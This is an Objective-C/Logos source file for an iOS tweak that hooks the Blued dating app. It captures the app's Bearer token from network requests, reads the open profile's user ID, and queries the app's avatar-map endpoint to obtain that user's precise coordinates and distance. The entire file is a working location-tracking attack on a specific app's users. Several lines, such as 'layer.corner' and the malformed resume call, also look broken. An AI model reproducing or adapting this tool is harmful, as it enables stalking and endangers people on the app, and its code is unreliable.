#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>

// 函数声明
void th_requestDistance(void);
void th_showAlert(NSString *title, NSString *msg);
void th_addBtn(void);
void th_removeBtn(void);

// 全局数据（巨魔权限：全局共享，无访问限制）
static NSString *gAuthToken = nil;
static NSString *gTargetUserID = nil;
static double gMyLat = 0.0;
static double gMyLon = 0.0;
static UIButton *gFloatBtn = nil;

#define EARTH_RADIUS 6371000.0

// 弹窗（巨魔专属：无权限限制）
void th_showAlert(NSString *title, NSString *msg) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil]];
        UIViewController *topVC = [UIApplication sharedApplication].windows.firstObject.rootViewController;
        while (topVC.presentedViewController) topVC = topVC.presentedViewController;
        [topVC presentViewController:alert animated:YES completion:nil];
    });
}

// 距离计算
double th_calcDist(double lat1, double lon1, double lat2, double lon2) {
    double rad = M_PI / 180.0;
    double dLat = (lat2 - lat1) * rad;
    double dLon = (lon2 - lon1) * rad;
    double a = sin(dLat/2) * sin(dLat/2) + cos(lat1*rad) * cos(lat2*rad) * sin(dLon/2) * sin(dLon/2);
    return 2 * EARTH_RADIUS * atan2(sqrt(a), sqrt(1-a));
}

// 悬浮按钮（巨魔专属：直接添加到窗口，无拦截）
void th_addBtn() {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gFloatBtn) return;
        gFloatBtn = [UIButton buttonWithType:UIButtonTypeSystem];
        gFloatBtn.frame = CGRectMake([UIScreen mainScreen].bounds.size.width - 80, 120, 60, 44);
        [gFloatBtn setTitle:@"查距离" forState:UIControlStateNormal];
        gFloatBtn.backgroundColor = UIColor.systemBlueColor;
        gFloatBtn.layer.corner = 22;
        gFloatBtn.clipsToBounds = YES;
        [gFloatBtn setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
        [gFloatBtn addTarget:nil action:@selector(th_requestDistance) forControlEvents:UIControlEventTouchUpInside];
        [[UIApplication sharedApplication].windows.firstObject addSubview:gFloatBtn];
    });
}

void th_removeBtn() {
    dispatch_async(dispatch_get_main_queue(), ^{
        [gFloatBtn removeFromSuperview];
        gFloatBtn = nil;
    });
}

// 核心查询（巨魔权限：网络请求无任何限制）
void th_requestDistance(void) {
    if (!gAuthToken || !gTargetUserID || gMyLat == 0) {
        th_showAlert(@"提示", @"信息获取中，请稍后");
        return;
    }

    NSMutableURLRequest *req = [[NSMutableURLRequest alloc] initWithURL:[NSURL URLWithString:@"https://social.irisgw.cn/users/avatar_map/index"] timeoutInterval:10];
    req.HTTPMethod = @"POST";
    [req setValue:@"zh-CN" forHTTPHeaderField:@"Accept-Language"];
    [req setValue:@"a0001i" forHTTPHeaderField:@"Channel"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [req setValue:gAuthToken forHTTPHeaderField:@"Authorization"];

    NSDictionary *body = @{
        @"self_location": @{@"latitude":@(gMyLat), @"longitude":@(gMyLon)},
        @"zoom_scale": @"3.77", @"avatar_span": @"56", @"use_pay_map": @0
    };
    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];

    [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
        if (err || !data) { th_showAlert(@"失败", @"网络错误"); return; }
        NSArray *avatars = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil][@"avatars"];
        for (NSDictionary *user in avatars) {
            if ([user[@"user_id"] isEqualToString:gTargetUserID]) {
                double dist = th_calcDist(gMyLat, gMyLon, [user[@"latitude"] doubleValue], [user[@"longitude"] doubleValue]);
                th_showAlert(@"成功", [NSString stringWithFormat:@"对方ID：%@\n距离：%.0f米", gTargetUserID, dist]);
                return;
            }
        }
        th_showAlert(@"提示", @"未找到用户");
    } resume];
}

// ==============================================
// 🔥 巨魔专属核心：0 系统 Hook！彻底不闪退
// 仅监听 Blued 自身页面，不碰任何iOS系统类
// ==============================================

// 监听个人主页显示按钮
%hook UIViewController
- (void)viewDidAppear:(BOOL)animated {
    %orig;
    if ([self.title isEqualToString:@"主页"] || [self.className containsString:@"Profile"]) {
        gTargetUserID = [[self valueForKey:@"userId"] stringValue];
        th_addBtn();
    }
}
- (void)viewDidDisappear:(BOOL)animated {
    %orig;
    th_removeBtn();
}
%end

// 监听网络请求头（仅被动读取，不修改系统）
%hook NSURLSessionDataTask
- (NSURLRequest *)originalRequest {
    NSURLRequest *req = %orig;
    NSString *auth = req.allHTTPHeaderFields[@"Authorization"];
    if (auth && [auth hasPrefix:@"Bearer "]) gAuthToken = auth;
    return req;
}
%end

// 监听定位（仅被动读取）
%hook CLLocationManager
- (void)startUpdatingLocation {
    %orig;
    gMyLat = self.location.coordinate.latitude;
    gMyLon = self.location.coordinate.longitude;
}
%end

%ctor {
    // 巨魔权限：插件启动即生效，无任何限制
}
